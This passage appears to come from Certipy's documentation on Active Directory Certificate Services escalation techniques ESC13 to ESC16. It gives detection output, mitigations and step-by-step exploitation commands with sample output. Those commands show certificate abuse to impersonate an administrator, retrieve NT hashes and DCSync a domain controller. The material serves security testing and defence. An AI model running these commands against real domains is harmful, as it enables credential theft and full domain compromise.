        [*] Got hash for 'attacker@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
        ```

        The TGT saved in `user.ccache` now includes the SID of the `CN=SecureAdmins,...` group (and any groups it's transitively a member of) because the KDC processed the Issuance Policy OID from the certificate during authentication. The attacker is still `attacker@corp.local` but now has the *effective group memberships* of "SecureAdmins".

    * **Step 3: Use the obtained TGT to perform privileged actions.**
        Set the Kerberos credential cache environment variable to point to the TGT obtained in Step 2 (this is a shell command, not Certipy):

        ```bash
        export KRB5CCNAME=user.ccache
        ```

        Then, use a tool that leverages Kerberos tickets (like Impacket's `secretsdump.py`) to perform actions that require the privileges of the linked group (e.g., if `SecureAdmins` has DCSync rights or is a member of a group that does, like Domain Admins).

        ```bash
        secretsdump.py -just-dc-user 'dc$' 'corp.local/user@dc.corp.local' -dc-ip '10.0.0.100' -target-ip '10.0.0.100' -k -no-pass
        ```

        * `-k -no-pass`: Use Kerberos authentication with the ticket from `KRB5CCNAME`.
        * The principal `corp.local/user@dc.corp.local` is just a construct for `secretsdump.py` when using `-k`; the actual identity and privileges come from the TGT.

        **Expected Output (if the "SecureAdmins" group grants DCSync privileges):**

        ```text
        Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

        [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
        [*] Using the DRSUAPI method to get NTDS.DIT secrets
        DC$:1001:aad3b435b51404eeaad3b435b51404ee:c2ebebf4389addf861f6cb81d314d5e5:::
        [*] Kerberos keys grabbed
        DC$:aes256-cts-hmac-sha1-96:dc53532237aa43b7ee6f3e3c6f965c25f398b0b8ec4790bf51ec438125e6485a
        DC$:aes128-cts-hmac-sha1-96:0eb40775ee03c76fc5e20ce4a8161f6c
        DC$:0x17:c2ebebf4389addf861f6cb81d314d5e5
        [*] Cleaning up...
        ```

        Successful execution of `secretsdump.py` demonstrates that the attacker, using the TGT derived from the ESC13 certificate, now possesses the privileges of the "SecureAdmins" group.

4. **Mitigations**

    * **Review and Limit Use of OID-Group Links:** Carefully scrutinize the use of Issuance Policies that are linked to AD groups via the `msDS-OIDToGroupLink` attribute. Understand which templates use these OID-based policies and which AD groups they are linked to. **Avoid linking Issuance Policies to highly privileged groups** (like Domain Admins, Enterprise Admins, or custom admin groups) unless absolutely necessary and with strong compensating controls and justifications.
    * **Secure OID Objects in Active Directory:** Audit the ACLs on the OID objects themselves, located in `CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=...`. Ensure that only highly trusted administrators (e.g., Enterprise Admins or a dedicated PKI OID management group) have permissions to create OID objects or modify their `msDS-OIDToGroupLink` attribute. This prevents attackers from creating malicious links.
    * **Restrict Enrollment Rights on Affected Templates:** For any template that uses an Issuance Policy linked to a group, grant "Enroll" permissions very restrictively, only to users or groups that legitimately require that specific policy and the associated group membership via their certificate.
    * **Implement Manager Approval:** For templates that use Issuance Policies linked to sensitive groups, consider enabling "CA certificate manager approval" in the template's "Issuance Requirements" tab to add a manual review step for each request.
    * **Use Authorized Signatures:** For high-impact templates, consider requiring authorized signatures, meaning the CSR must be co-signed by one or more users holding specific "enrollment agent" certificates.
    * **Disable Unused Templates or OID Links:** If a template using an OID-group link is found to be vulnerable or is no longer needed, disable the template or remove the OID link from the OID object.

---

## **ESC14: Weak Explicit Certificate Mapping**

1. **Description**

    ESC14 addresses vulnerabilities arising from "weak explicit certificate mapping", primarily through the misuse or insecure configuration of the `altSecurityIdentities` attribute on Active Directory user or computer accounts. This multi-valued attribute allows administrators to manually associate X.509 certificates with an AD account for authentication purposes. When populated, these explicit mappings can override the default certificate mapping logic, which typically relies on UPNs or DNS names in the SAN of the certificate, or the SID embedded in the `szOID_NTDS_CA_SECURITY_EXT` security extension.

    A "weak" mapping occurs when the string value used within the `altSecurityIdentities` attribute to identify a certificate is too broad, easily guessable, relies on non-unique certificate fields, or uses easily spoofable certificate components. If an attacker can obtain or craft a certificate whose attributes match such a weakly defined explicit mapping for a privileged account, they can use that certificate to authenticate as and impersonate that account.

    Examples of potentially weak `altSecurityIdentities` mapping strings include:

    * Mapping solely by a common Subject Common Name (CN): e.g., `X509:<S>CN=SomeUser`. An attacker might be able to obtain a certificate with this CN from a less secure source.
    * Using overly generic Issuer Distinguished Names (DNs) or Subject DNs without further qualification like a specific serial number or subject key identifier: e.g., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
    * Employing other predictable patterns or non-cryptographic identifiers that an attacker might be able to satisfy in a certificate they can legitimately obtain or forge (if they have compromised a CA or found a vulnerable template like in ESC1).

    The `altSecurityIdentities` attribute supports various formats for mapping, such as:

    * `X509:<I>IssuerDN<S>SubjectDN` (maps by full Issuer and Subject DN)
    * `X509:<SKI>SubjectKeyIdentifier` (maps by the certificate's Subject Key Identifier extension value)
    * `X509:<SR>SerialNumberBackedByIssuerDN` (maps by serial number, implicitly qualified by the Issuer DN) - this is not a standard format, usually it's `<I>IssuerDN<SR>SerialNumber`.
    * `X509:<RFC822>EmailAddress` (maps by an RFC822 name, typically an email address, from the SAN)
    * `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (maps by a SHA1 hash of the certificate's raw public key - generally strong)

    The security of these mappings depends heavily on the specificity, uniqueness, and cryptographic strength of the chosen certificate identifiers used in the mapping string. Even with strong certificate binding modes enabled on Domain Controllers (which primarily affect implicit mappings based on SAN UPNs/DNS and the SID extension), a poorly configured `altSecurityIdentities` entry can still present a direct path for impersonation if the mapping logic itself is flawed or too permissive.

2. **Identification**

    Certipy **does not** directly detect ESC14 vulnerabilities by actively querying or analyzing the `altSecurityIdentities` attribute on AD objects. Identifying weak `altSecurityIdentities` configurations typically involves:

    * **Querying Active Directory:** Use tools like PowerShell with AD cmdlets (`Get-ADUser -Properties altSecurityIdentities`), `ldp.exe`, or custom LDAP query tools to retrieve the `altSecurityIdentities` attribute for users and computers, especially privileged accounts.
    * **Using BloodHound:** BloodHound, when its data collection includes user and computer object properties (specifically `altSecurityIdentities`), can help identify accounts where this attribute is populated. Custom Cypher queries might then be needed to analyze the *strength* or patterns of these mapping strings, though BloodHound doesn't inherently classify them as "weak".
    * **Manual Review of Mapping Strings:** The retrieved `altSecurityIdentities` strings must be manually analyzed for potential weaknesses. This involves checking if they rely on common names only, lack issuer specificity, use predictable serial numbers (if applicable), or employ other non-unique or easily impersonated certificate characteristics.

    The SpecterOps blog post "[ADCS ESC14 Abuse Technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9)" by Jonas Bülow Knudsen provides detailed information on what constitutes weak mappings and offers further guidance on finding them.

3. **Exploitation**

    Certipy itself **does not** directly exploit ESC14 in the sense of modifying the `altSecurityIdentities` attribute on an AD account or automatically crafting a certificate to match a discovered weak mapping.

    The exploitation process for ESC14 generally involves these conceptual steps, where Certipy might be used in the final authentication phase:

    1. **Identify a Weak Explicit Mapping:** An attacker first identifies a privileged AD account that has a weakly configured `altSecurityIdentities` entry (using methods described in the "Identification" section). For example, they find that `DomainAdminUser` has an `altSecurityIdentities` entry like `X509:<S>CN=DAUserBackupCert`.
    2. **Obtain or Forge a Matching Certificate:** This is the crucial step. The attacker must then obtain a certificate that satisfies the criteria of this weak mapping. This could be achieved through various means, which often rely on other AD CS vulnerabilities or attack paths.
    3. **Authenticate as the Target Account:** Once the attacker has a PFX file for the certificate that they believe matches the weak mapping criteria for the target privileged account, they can use Certipy's `auth` command to attempt authentication.

    **Example (Conceptual - assuming `malicious.pfx` contains a certificate crafted or obtained to match a weak `altSecurityIdentities` mapping for `administrator@corp.local`):**

    ```bash
    certipy auth \
        -dc-ip '10.0.0.100' -pfx 'malicious.pfx' \
        -username 'administrator@corp.local' -domain 'corp.local'
    ```

    If the certificate in `malicious.pfx` (e.g., its Subject CN, or Issuer/Subject combination) successfully matches a weak string in the `altSecurityIdentities` attribute of the `administrator@corp.local` account, and that mapping is honored by the KDC, this command would result in obtaining a TGT (and potentially the NTLM hash) for `administrator@corp.local`. The specific output would be similar to other successful `certipy auth` authentications, indicating a TGT was obtained.

    The core of ESC14 exploitation lies in the reconnaissance to find the weak `altSecurityIdentities` mapping and then leveraging other techniques or vulnerabilities to craft or obtain a certificate that satisfies that weak definition.

4. **Mitigations**

    Securing against ESC14 involves ensuring that any explicit certificate mappings defined via `altSecurityIdentities` are strong, specific, and well-managed.

    * **Use Strong Mapping Formats:** When populating `altSecurityIdentities`, prioritize cryptographically strong and highly specific identifiers. Recommended formats generally include:
        * `X509:<I>IssuerDN<SR>SerialNumber`: Maps a specific certificate by its unique Issuer DN and Serial Number combination. This is very strong as it ties to a single certificate instance.
        * `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`: Maps by a SHA1 hash of the certificate's raw public key. This is also very strong as it's tied to a specific key pair. (Note: While SHA1 is used in this legacy attribute name, the actual cryptographic hash strength for new certificates should align with current best practices).
    * **Avoid Weak Mapping Formats:** Do not map certificates based solely on easily spoofable or non-unique fields like Subject CN (e.g., `X509:<S>CN=username`) or simple email addresses (`X509:<RFC822>some.email@domain.com`) without strong issuer constraints or other unique qualifiers. Avoid mappings that are too generic or rely on attributes an attacker might control or easily replicate.
    * **Enforce Strong Certificate Binding on DCs:** Ensure Domain Controllers are configured for `StrongCertificateBindingEnforcement = 2` (Full Enforcement Mode) as per KB5014754. While this primarily targets implicit mappings (like SAN UPNs/DNS and the SID extension), it also influences how some `altSecurityIdentities` formats are processed and may deprecate or add stricter requirements for very weak or ambiguous explicit mapping types.

---

## **ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu")**

1. **Description**

    ESC15, also known by the community name "EKUwu" (research by Justin Bollinger from TrustedSec) and tracked as CVE-2024-49019, describes a vulnerability affecting unpatched CAs. It allows an attacker to inject arbitrary Application Policies into a certificate issued from a Version 1 (Schema V1) certificate template. If the CA has not been updated with the relevant security patches (Nov 2024), it will incorrectly include these attacker-supplied Application Policies in the issued certificate. This occurs even if these policies are not defined in, or are inconsistent with, the template's intended Extended Key Usages (EKUs), thereby granting the certificate unintended capabilities.

    For instance, an attacker could request a certificate from a V1 "WebServer" template (which typically only permits "Server Authentication" EKU) and, through this vulnerability, inject the "Client Authentication" OID (`1.3.6.1.5.5.7.3.2`) as an Application Policy. The resulting certificate could then potentially be used for client logon, contrary to the template's design. This attack is similar in principle to ESC1 (Enrollee Supplies Subject for SAN abuse) or ESC2 (Any Purpose EKU abuse) but specifically leverages the `szOID_APPLICATION_CERT_POLICIES` (Application Policies) certificate extension.

    **Prerequisite for ESC15:** Based on current understanding and the exploitation details, this vulnerability appears to primarily affect Version 1 templates that *also* have the "Enrollee supplies subject" (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) setting enabled. This combination allows the attacker to provide subject information (which might be necessary for the target use case) alongside the malicious Application Policies in the CSR.

    **Technical Deep Dive (Pre-Patch Behavior):**

    * **Version 1 Template Behavior:** V1 templates are simpler than V2+ templates. They do not have a distinct "Application Policies" tab in their configuration. By default, when a CA processes a request for a V1 template, it often copies the EKUs defined in the template into both the EKU extension and the Application Policies extension of the issued certificate.
    * **The Vulnerability (CVE-2024-49019 on Unpatched CAs):** When an attacker submits a CSR for a vulnerable V1 template (with "Enrollee supplies subject") to an unpatched CA, and that CSR includes an attacker-specified Application Policies extension, the CA would incorporate this attacker-supplied extension into the issued certificate as-is. It would not necessarily override, strip, or validate these injected policies against the template's defined EKUs.
    * **Impact:** An attacker could enroll for such a V1 template and inject potent Application Policy OIDs. For example:
        * "Client Authentication" (OID `1.3.6.1.5.5.7.3.2`) to enable network logon.
        * "Certificate Request Agent" (OID `1.3.6.1.4.1.311.20.2.1`) to enable the certificate to act as an enrollment agent (leading to an ESC3-like attack).
            Windows systems (KDC for Kerberos PKINIT, or Schannel for TLS) might honor these injected Application Policies for authentication or enrollment agent purposes, effectively bypassing the EKU restrictions intended by the V1 template.

2. **Identification with Certipy**

    Certipy's `find` command can help identify V1 templates that are potentially susceptible to ESC15 if the CA is unpatched. The tool looks for templates that are Schema Version 1 *and* have "Enrollee supplies subject" enabled, making them prime candidates for this attack if the CA lacks the patch for CVE-2024-49019.

    **Expected Output Snippet (Template View):**
    The output for a potentially vulnerable V1 template (e.g., "WebServer" if configured with "Enrollee supplies subject" and enrollable by the attacker) would show:

    ```text
    Certificate Authorities
      0
        CA Name                             : CORP-CA
        DNS Name                            : CA.CORP.LOCAL
    ...
    Certificate Templates
    ...
      6
        Template Name                       : WebServer
        Display Name                        : Web Server
        Certificate Authorities             : CORP-CA
        Enabled                             : True
        Client Authentication               : False
        Enrollment Agent                    : False
        Any Purpose                         : False
        Enrollee Supplies Subject           : True
        Certificate Name Flag               : EnrolleeSuppliesSubject
        Extended Key Usage                  : Server Authentication
        Requires Manager Approval           : False
        ...
        Authorized Signatures Required      : 0
        Schema Version                      : 1
        ...
        Permissions
          Enrollment Permissions
            Enrollment Rights               : CORP.LOCAL\Domain Admins
                                              CORP.LOCAL\Enterprise Admins
                                              CORP.LOCAL\Authenticated Users
        ...
        [+] User Enrollable Principals      : CORP.LOCAL\Authenticated Users
        [!] Vulnerabilities
          ESC15                             : Enrollee supplies subject and schema version is 1.
        [*] Remarks
          ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
    ```

    **Key indicators:**

    * `[!] Vulnerabilities ESC15 : Enrollee supplies subject and schema version is 1.` This directly flags a template meeting the typical prerequisites for ESC15.
    * `Enrollee Supplies Subject : True`
    * `Schema Version : 1`
    * `[+] User Enrollable Principals` showing that the current user has enrollment rights for the template.
    * The `[*] Remarks` correctly notes that exploitability depends on the CA being unpatched for CVE-2024-49019.

3. **Exploitation with Certipy**

    Certipy's `req` command, using the `-application-policies` parameter, allows attackers to specify OIDs to be injected into the Application Policies extension of the CSR. This is the mechanism used to exploit ESC15 on an unpatched CA.

    **Scenario A: Direct Impersonation via Schannel (Injecting "Client Authentication" Application Policy)**
    This assumes the vulnerable V1 template (e.g., "WebServer" as configured above with "Enrollee supplies subject") allows the attacker to specify the target's UPN in the SAN, and the target service (like LDAPS) uses Schannel.

    * **Step 1: Request a certificate, injecting "Client Authentication" Application Policy and target UPN.**
        Attacker `attacker@corp.local` targets `administrator@corp.local` using the "WebServer" V1 template (which allows enrollee-supplied subject).

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -template 'WebServer' \
            -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
            -application-policies 'Client Authentication'
        ```

        * `-template 'WebServer'`: The vulnerable V1 template with "Enrollee supplies subject".
        * `-application-policies 'Client Authentication'`: Injects the OID `1.3.6.1.5.5.7.3.2` into the Application Policies extension of the CSR.
        * `-upn 'administrator@corp.local'`: Sets the UPN in the SAN for impersonation.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [*] Successfully requested certificate
        [*] Got certificate with UPN 'administrator@corp.local'
        [*] Certificate object SID is 'S-1-5-21-...-500'
        [*] Saving certificate and private key to 'administrator.pfx'
        [*] Wrote certificate and private key to 'administrator.pfx'
        ```

        If the CA is unpatched, the resulting `administrator.pfx` will contain a certificate with the "Client Authentication" Application Policy, despite the "WebServer" template not officially granting it via EKU.

    * **Step 2: Authenticate via Schannel (LDAPS) using the obtained certificate.**

        ```bash
        certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN UPN: 'administrator@corp.local'
        [*] Connecting to 'ldaps://10.0.0.100:636'
        [*] Authenticated to '10.0.0.100' as: 'u:CORP\\Administrator'
        Type help for list of commands

        #
        ```

        The attacker is authenticated as `CORP\Administrator` over LDAPS because Schannel on the DC honored the injected "Client Authentication" Application Policy.

    **Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse (Injecting "Certificate Request Agent" Application Policy)**
    This scenario involves first obtaining an "agent" certificate by injecting the "Certificate Request Agent" policy, and then using that to request a certificate for a privileged user.

    * **Step 1: Request a certificate from a V1 template (with "Enrollee supplies subject"), injecting "Certificate Request Agent" Application Policy.**
        This certificate is for the attacker (`attacker@corp.local`) to become an enrollment agent. No UPN is specified for the attacker's own identity here, as the goal is the agent capability.

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -template 'WebServer' \
            -application-policies 'Certificate Request Agent'
        ```

        * `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [*] Successfully requested certificate
        [*] Got certificate without identity
        [*] Certificate has no object SID
        [*] Try using -sid to set the object SID or see the wiki for more details
        [*] Saving certificate and private key to 'attacker.pfx'
        [*] Wrote certificate and private key to 'attacker.pfx'
        ```

        The attacker's `attacker.pfx` now contains a certificate which, if the CA is unpatched, includes the "Certificate Request Agent" Application Policy, allowing it to act as an enrollment agent certificate.

    * **Step 2: Use the "agent" certificate to request a certificate on behalf of a target privileged user.**
        This is an ESC3-like step, using the certificate from Step 1 as the agent certificate.

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -template 'User' \
            -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 2
        [*] Successfully requested certificate
        [*] Got certificate with UPN 'Administrator@CORP.LOCAL'
        [*] Certificate object SID is 'S-1-5-21-...-500'
        [*] Saving certificate and private key to 'administrator.pfx'
        [*] Wrote certificate and private key to 'administrator.pfx'
        ```

    * **Step 3: Authenticate as the privileged user using the "on-behalf-of" certificate.**

        ```bash
        certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)
        [*] Certificate identities:
        [*]     SAN UPN: 'Administrator@CORP.LOCAL'
        [*]     Security Extension SID: 'S-1-5-21-...-500'
        [*] Using principal: 'administrator@corp.local'
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saving credential cache to 'administrator.ccache'
        [*] Wrote certificate and private key to 'administrator.ccache'
        [*] Trying to retrieve NT hash for 'administrator'
        [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
        ```

        Successful authentication as Administrator is achieved.

4. **Mitigations**

    * **Apply Security Patches (CVE-2024-49019):** This is the primary and most effective mitigation. Install the Microsoft security updates addressing CVE-2024-49019 on all CA servers. These patches, published in Nov 2024, should ensure the CA correctly handles (e.g., rejects, strips, or validates against template settings) attacker-supplied Application Policies in CSRs for V1 templates.
    * **Restrict Enrollment for Vulnerable V1 Templates:** For any V1 templates that *also* have "Enrollee supplies subject" enabled, severely limit enrollment rights. If feasible, upgrade such V1 templates to V2 or newer, which provide more granular control over all certificate extensions, including Application Policies and EKUs.
    * **Consider Disabling Application Policies from CSR (Workaround - Use with Extreme Caution):** If immediate patching is absolutely not possible (highly discouraged), a CA *might* be configured to ignore the Microsoft Application Policies extension (OID `1.3.6.1.4.1.311.21.10`, `szOID_APPLICATION_CERT_POLICIES`) when submitted in CSRs. This could potentially be achieved by adding its OID to the `DisableExtensionList` registry key on the CA:

        ```bat
        certutil -setreg policy\DisableExtensionList +1.3.6.1.4.1.311.21.10
        net stop certsvc
        net start certsvc
        ```

        **Warning:** This is a broad measure and could have unintended consequences for legitimate certificate requests that rely on specifying application policies in the CSR. It should be thoroughly tested in a non-production environment. Patching is the preferred solution.
    * **Standard Mitigations:**
        * **Restrict Enrollment Rights:** Even for patched systems, ensure enrollment permissions for all templates are granted on a least-privilege basis.
        * **Implement Manager Approval:** For sensitive templates, enable "CA certificate manager approval".
        * **Use Authorized Signatures:** For high-impact scenarios, require CSRs to be co-signed by enrollment agents.
        * **Disable Unused Templates:** If a V1 template with "Enrollee supplies subject" is not needed, disable it.

---

## **ESC16: Security Extension Disabled on CA (Globally)**

1. **Description**

    ESC16 describes a misconfiguration where the CA itself is globally configured to disable the inclusion of the `szOID_NTDS_CA_SECURITY_EXT` (OID `1.3.6.1.4.1.311.25.2`) security extension in *all* certificates it issues. This SID extension, introduced with the May 2022 security updates (KB5014754), is vital for "strong certificate mapping", enabling DCs to reliably map a certificate to a user or computer account's SID for authentication.

    When a CA has the OID `1.3.6.1.4.1.311.25.2` added to its `policy\DisableExtensionList` registry setting (under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>`), every certificate issued by this CA will lack this SID security extension. This effectively makes *all* templates published by this CA behave as if they were individually configured with the `CT_FLAG_NO_SECURITY_EXTENSION` flag (as seen in ESC9).

    The primary impact is that if Domain Controllers are not operating in "Full Enforcement" mode for strong certificate binding (`StrongCertificateBindingEnforcement` registry key value is not `2`), they will fall back to weaker, legacy certificate mapping methods (e.g., based on UPN or DNS name found in the certificate's SAN). This reopens attack vectors similar to those exploited by the "Certifried" vulnerability (CVE-2022-26923) before the widespread adoption of strong mapping. Such a CA-level misconfiguration might occur if administrators, attempting to resolve compatibility issues after the May 2022 patches, opted to globally disable the new SID extension as a broad workaround instead of addressing issues on specific templates or client systems.

    **Alternative Cause for ESC16-like Behavior:**
    An important note is that if a CA server itself has **not been patched with the May 2022 security updates (KB5014754) or subsequent cumulative updates that include it**, it will not be capable of issuing the `szOID_NTDS_CA_SECURITY_EXT` at all. In such a scenario, the CA behaves *as if* ESC16 were configured, because no certificates it issues will contain this extension. Given the current date, CAs should be well beyond this patch level, but unpatched legacy systems could still exhibit this behavior.

    Exploitability of ESC16, similar to ESC9, depends on the DC's `StrongCertificateBindingEnforcement` setting:

    1. **With UPN Manipulation (in Compatibility Mode - `StrongCertificateBindingEnforcement = 1` or `0`):**
        If an attacker has control over an account's UPN (e.g., via `GenericWrite`) and that account can enroll for *any* client authentication certificate from the ESC16-vulnerable CA, they can:

        * Change the victim account's UPN to match a target privileged account's `sAMAccountName`.
        * Request a certificate (which will automatically lack the SID security extension due to the CA's ESC16 configuration).
        * Revert the UPN change.
        * Use the certificate to impersonate the target.

    2. **Combined with ESC6 (CA also allows SAN specification via request attributes):**
        This method is effective even if DCs are in "Full Enforcement" mode (`StrongCertificateBindingEnforcement = 2`). The attacker:

        * Requests *any* client authentication certificate from the ESC16-vulnerable CA (ensuring no SID security extension is added by the CA).
        * Simultaneously uses an ESC6 vulnerability on the same CA to inject the target's UPN and SID (formatted as a special SAN URL: `URL=tag:microsoft.com,2022-09-14:sid:<VALUE>`) into the certificate request.
        * The KDC, finding no SID security extension (due to ESC16) but seeing the SAN SID URL (due to ESC6), will use the SAN SID for authentication.

2. **Identification with Certipy**

    Certipy's `find` command can identify if the CA is configured to globally disable the SID security extension by checking its `Disabled Extensions` list.

    **Expected Output Snippet:**

    Under the "Certificate Authorities" section for the target CA, look for the OID `1.3.6.1.4.1.311.25.2` in the `Disabled Extensions` list and the `ESC16` vulnerability flag.

    ```text
    Certificate Authorities
      0
        CA Name                             : CORP-CA
        DNS Name                            : CA.CORP.LOCAL
        ...
        Request Disposition                 : Issue
        ...
        Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
        ...
        Permissions
          Access Rights
            ...
            Enroll                          : CORP.LOCAL\Authenticated Users
        [+] User Enrollable Principals      : CORP.LOCAL\Authenticated Users
        [!] Vulnerabilities
          ESC16                             : Security Extension is disabled.
        [*] Remarks
          ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
    ```

    **Key indicators:**

    * `[!] Vulnerabilities ESC16 : Security Extension is disabled.` This directly flags the CA-level misconfiguration.
    * The `Disabled Extensions` list for the CA contains the OID `1.3.6.1.4.1.311.25.2` (`szOID_NTDS_CA_SECURITY_EXT`).
    * The `[*] Remarks ESC16 : Other prerequisites...` highlights that exploitability often depends on the DC's certificate binding mode or other vulnerabilities like ESC6.

3. **Exploitation with Certipy**

    The exploitation mechanisms for ESC16 are identical to those for ESC9 because the end result - a certificate lacking the SID security extension - is the same. The important difference is that for ESC16, *any* certificate template enabling client authentication and issued by this misconfigured CA can be used in the UPN manipulation attack, not just a template specifically flagged with `CT_FLAG_NO_SECURITY_EXTENSION`.

    **Scenario A: UPN Manipulation (Requires `StrongCertificateBindingEnforcement = 1` (Compatibility) or `0` (Disabled) on DCs, and attacker has write access to a "victim" account's UPN)**

    Attacker (`attacker@corp.local`) has `GenericWrite` permission over a "victim" account (`victim@corp.local`). The `victim` account can enroll in *any suitable client authentication template* (e.g., the default "User" template) on the ESC16-vulnerable CA. The target for impersonation is `administrator@corp.local`.

    * **Step 1: Read initial UPN of the victim account (Optional - for restoration).**

        ```bash
        certipy account \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -user 'victim' \
            read
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Reading attributes for 'victim':
            cn                                  : Victim
            userPrincipalName                   : victim@CORP.LOCAL
        ...
        ```

    * **Step 2: Update the victim account's UPN to the target administrator's `sAMAccountName`.**

        ```bash
        certipy account \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -upn 'administrator' \
            -user 'victim' update
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Updating user 'victim':
            userPrincipalName                   : administrator
        [*] Successfully updated 'victim'
        ```

    * **Step 3: (If needed) Obtain credentials for the "victim" account (e.g., via Shadow Credentials).**

        ```bash
        certipy shadow \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -account 'victim' \
            auto
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)
        ...
        [*] Saving credential cache to 'victim.ccache'
        [*] Wrote credential cache to 'victim.ccache'
        [*] NT hash for 'victim': fc525c9683e8fe067095ba2ddc971889
        ```

    * **Step 4: Request a certificate as the "victim" user from *any suitable client authentication template* (e.g., "User") on the ESC16-vulnerable CA.**
        Because the CA is vulnerable to ESC16, it will automatically omit the SID security extension from the issued certificate, regardless of the template's specific settings for this extension.
        Set the Kerberos credential cache environment variable (shell command):

        ```bash
        export KRB5CCNAME=victim.ccache
        ```

        Then request the certificate:

        ```bash
        certipy req \
            -k -dc-ip '10.0.0.100' \
            -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
            -template 'User'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [*] Successfully requested certificate
        [*] Got certificate with UPN 'administrator@corp.local'
        [*] Certificate has no object SID
        [*] Try using -sid to set the object SID or see the wiki for more details
        [*] Saving certificate and private key to 'administrator.pfx'
        [*] Wrote certificate and private key to 'administrator.pfx'
        ```

    * **Step 5: Revert the "victim" account's UPN.**

        ```bash
        certipy account \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
            -user 'victim' update
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Updating user 'victim':
            userPrincipalName                   : victim@corp.local
        [*] Successfully updated 'victim'
        ```

    * **Step 6: Authenticate as the target administrator.**

        ```bash
        certipy auth \
            -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
            -username 'administrator' -domain 'corp.local'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN UPN: 'administrator'
        [*] Using principal: 'administrator@corp.local'
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saving credential cache to 'administrator.ccache'
        [*] Wrote credential cache to 'administrator.ccache'
        [*] Trying to retrieve NT hash for 'administrator'
        [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
        ```

        Note the `Certificate identities` list only shows `SAN UPN: 'administrator'`, confirming the absence of any SID extensions in this certificate.

    **Scenario B: ESC16 Combined with ESC6 (CA allows SAN specification via request attributes)**
    This method works even if DCs are in Full Enforcement mode (`StrongCertificateBindingEnforcement = 2`). The attacker enrolls for *any* client authentication template on the ESC16-vulnerable CA. ESC16 ensures no SID security extension is added by the CA. Simultaneously, an ESC6 vulnerability on the same CA allows the attacker to inject the target's SID into the SAN using the special URL format.

    * **Step 1: Request certificate, using ESC6 to specify target UPN and SID in SAN.**
        Attacker `attacker@corp.local` requests the certificate from any suitable client authentication template (e.g., "User") on the CA that is vulnerable to both ESC16 and ESC6.

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -template 'User' \
            -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [*] Successfully requested certificate
